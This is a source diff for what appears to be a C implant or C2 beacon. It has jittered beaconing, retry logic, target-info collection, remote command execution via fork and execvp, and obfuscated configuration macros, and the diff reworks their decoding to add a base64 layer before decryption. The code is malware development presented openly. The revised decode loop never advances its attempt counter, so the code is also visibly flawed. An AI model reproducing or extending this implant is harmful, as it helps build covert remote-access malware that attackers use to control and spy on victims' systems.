@@ -1,7 +1,6 @@
 /*
     TODO:
-        - I need to implement correct parsing (b64) from MACROS in decodeMacro
-        - I need to correct parseInt from every INT macro, as i'll use the malfoy to encode every macro and spell option :(
+        - Test and debug
 
 */
 
@@ -22,7 +21,7 @@
 #include <cpuid.h>
 #include "libfidelius.h"
 #include "librituals.h"
-// #include "libutils.h"
+#include "libutils.h"
 #include "macros.h"
 
 // helper defs
@@ -40,7 +39,7 @@ double jitterIT(double baseVal, double jitter);
 void whileSleep(long sleepTime);
 void sleepBeacon();
 int retry(int baseDelay, char *method, int currentAttempt, int maxAttemptsCap, int *payloadEncoderID);
-C_Scroll fetchTargetInfo(int *payloadEncoderID); // I'll do this later, 1st i need to implement basic beacon :3
+C_Scroll fetchTargetInfo(int *payloadEncoderID);
 void beacon(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID);
 
 // types
@@ -542,7 +541,7 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
         close(pipeOut[1]);
 
         execvp(cmd, cmdArgs);
-        _exit(127); // Exit 127 means "Command not found", the _exit instead of exit will not use atexit() handlers, GPT said that is the convention for subprocess that runs commands
+        _exit(127); // Exit 127 means "Command not found", the _exit instead of exit will not use atexit() handlers, GPT said that it is the convention for subprocess that runs commands
 
     } else {
         close(pipeOut[1]);
@@ -659,19 +658,25 @@ int parseInt(char* string, int fallback) {
 };
 
 char* decodeMacro(char* macroEncoded, int *payloadEncoderID) {
-    int maxAttempts = 5;
-    int currentAttempt = 1;
-    char *_decodedMacro = NULL;
-    int _decodedMacroLen = 0;
-    int _decodedMacroStatus = Decode(*payloadEncoderID, macroEncoded, (int)strlen(macroEncoded), &_decodedMacro, &_decodedMacroLen);
-    while (_decodedMacroStatus == 0 && currentAttempt < maxAttempts) {
-        DestroyEncoder(*payloadEncoderID);
-        *payloadEncoderID = getPayloadEncoder();
-        _decodedMacroStatus = Decode(*payloadEncoderID, macroEncoded, (int)strlen(macroEncoded), &_decodedMacro, &_decodedMacroLen);
+    _go_base64 macroDecodedB64 = _b64_d(macroEncoded);
+    if (macroDecodedB64.data == NULL) {
+        _exit(1); // Can't parse smt, quit to avoid trouble
 
     }
 
-    return _decodedMacro;
+    int maxAttempts = 5;
+    int currentAttempt = 0;
+    unsigned char *_decodedMacro = NULL;
+    int _decodedMacroStatus = 0;
+    while (_decodedMacroStatus == 0 && currentAttempt < maxAttempts) {
+        DestroyEncoder(*payloadEncoderID);
+        *payloadEncoderID = getPayloadEncoder();
+        int _decodedMacroLen = 0;
+        _decodedMacroStatus = Decode(*payloadEncoderID, macroDecodedB64.data, macroDecodedB64.len, &_decodedMacro, &_decodedMacroLen);
+
+    }
+
+    return (char*)_decodedMacro;
 
 };
 
